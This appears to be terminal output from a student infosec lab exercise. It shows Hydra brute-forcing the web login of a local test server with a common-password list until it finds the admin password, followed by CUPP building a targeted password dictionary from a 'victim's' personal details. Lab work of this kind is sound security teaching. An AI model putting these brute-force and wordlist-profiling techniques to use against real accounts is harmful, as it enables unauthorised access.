+[ATTEMPT] target localhost - login "root" - pass "789456" - 80 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "asdfgh" - 81 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "love123" - 82 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "abcd1234" - 83 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "jordan23" - 84 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "88888888" - 85 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "12345admin" - 86 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "5201314" - 87 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "12qwaszx" - 88 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "FQRG7CS493" - 89 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "ashley" - 90 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "asdf" - 91 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "asd123" - 92 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "superman" - 93 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "jessica" - 94 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "love" - 95 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "samsung" - 96 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "shadow" - 97 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "blink182" - 98 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "333333" - 99 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "michael1" - 100 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "babygirl1" - 101 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123456" - 102 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123456789" - 103 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "111111" - 104 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "password" - 105 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "qwerty" - 106 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "admin" - 107 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "abc123" - 108 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "12345678" - 109 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "password1" - 110 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "1234567" - 111 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123123" - 112 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "1234567890" - 113 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "000000" - 114 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "12345" - 115 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "iloveyou" - 116 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "1q2w3e4r5t" - 117 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "1234" - 118 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123456a" - 119 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "qwertyuiop" - 120 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "monkey" - 121 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123321" - 122 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "dragon" - 123 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "654321" - 124 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "666666" - 125 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123" - 126 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "myspace1" - 127 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "a123456" - 128 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "121212" - 129 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "1qaz2wsx" - 130 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123qwe" - 131 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123abc" - 132 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "tinkle" - 133 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "target123" - 134 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "gwerty" - 135 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "1g2w3e4r" - 136 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "gwerty123" - 137 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "zag12wsx" - 138 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "7777777" - 139 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "qwerty1" - 140 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "1q2w3e4r" - 141 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "987654321" - 142 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "222222" - 143 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "qwe123" - 144 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "qwerty123" - 145 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "zxcvbnm" - 146 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "555555" - 147 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "112233" - 148 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "fuckyou" - 149 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "asdfghjkl" - 150 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "12345a" - 151 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123123123" - 152 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "1q2w3e" - 153 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "qazwsx" - 154 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "computer" - 155 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "aaaaaa" - 156 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "159753" - 157 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "iloveyou1" - 158 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "fuckyou1" - 159 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "princess" - 160 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "789456123" - 161 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "11111111" - 162 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123654" - 163 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "princess1" - 164 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "888888" - 165 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "linkedin" - 166 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "michael" - 167 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "sunshine" - 168 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "football" - 169 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "11111" - 170 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "777777" - 171 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "1234qwer" - 172 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "999999" - 173 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "j38ifUbn" - 174 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "monkey1" - 175 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "football1" - 176 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "daniel" - 177 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "azerty" - 178 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "a12345" - 179 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "123456789a" - 180 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "789456" - 181 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "asdfgh" - 182 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "love123" - 183 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "abcd1234" - 184 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "jordan23" - 185 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "88888888" - 186 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "12345admin" - 187 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "5201314" - 188 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "12qwaszx" - 189 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "FQRG7CS493" - 190 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "ashley" - 191 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "asdf" - 192 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "asd123" - 193 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "superman" - 194 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "jessica" - 195 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "love" - 196 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "samsung" - 197 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "shadow" - 198 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "blink182" - 199 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "333333" - 200 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "michael1" - 201 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "babygirl1" - 202 of 1717 [child 12] (0/0)
+[8000][http-post-form] host: localhost   login: admin   password: 12345admin
+[STATUS] attack finished for localhost (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-06 01:07:11
+
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$ cd ..
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/cupp$ python3 cupp.py -i
+ ___________ 
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\   
+              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                            [ Mebus | https://github.com/Mebus/]
+
+
+[+] Insert the information about the victim to make a dictionary
+[+] If you don't know all the info, just hit enter when asked! ;)
+
+> First Name: AUCA
+> Surname: auca
+> Nickname: auk
+> Birthdate (DDMMYYYY): 01091993
+
+
+> Partners) name: None
+> Partners) nickname: none
+> Partners) birthdate (DDMMYYYY): 00000000
+
+
+> Child's name: Sofia
+> Child's nickname: Sonya
+> Child's birthdate (DDMMYYYY): 16092005
+
+
+> Pet's name: horses
+> Company name: rogaikopyta
+
+
+> Do you want to add some key words about the victim? Y/[N]: n
+> Do you want to add special chars at the end of words? Y/[N]: n
+> Do you want to add some random numbers at the end of words? Y/[N]:n
+> Leet mode? (i.e. leet = 1337) Y/[N]: n
+
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+[+] Saving dictionary to auca.txt, counting 8269 words.
+> Hyperspeed Print? (Y/n) : n
+[+] Now load your pistolero with auca.txt and shoot! Good luck!
+
